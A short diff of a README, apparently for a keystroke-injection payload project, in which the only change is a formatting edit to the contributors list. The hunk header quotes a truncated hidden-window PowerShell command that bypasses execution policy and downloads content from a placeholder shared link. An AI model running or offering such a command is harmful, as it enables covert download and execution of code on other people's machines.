@@ -48,9 +48,10 @@ powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the inten
 
 ## Contributing
 
-All contributors names will be listed here
+All contributors names will be listed here:
 
 atomiczsec
+
 I am Jakoby
 
 <p align="right">(<a href="#top">back to top</a>)</p>
